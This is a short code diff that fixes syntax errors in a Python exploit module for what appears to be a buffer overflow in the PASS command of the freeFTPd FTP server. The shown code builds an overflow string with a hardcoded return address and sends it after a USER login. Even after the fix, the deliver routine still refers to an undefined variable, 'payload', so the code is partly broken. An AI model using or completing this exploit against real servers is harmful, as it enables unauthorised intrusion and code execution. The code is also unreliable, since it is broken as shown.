@@ -11,10 +11,10 @@ class freeftpdPassOverflowMenu(core.Exploit):
     p += self.rand_text(2)
     p += "\xbb\x14\x40\x00"
     return p
-  def deliver(self, p)
+  def deliver(self, p):
     self.init_deliver()
     s = self.connect()
-    s.send("USER " + self.variables["user"]
+    s.send("USER " + self.variables["user"])
     s.recv(1024)
     s.send("PASS " + payload)
     s.close()
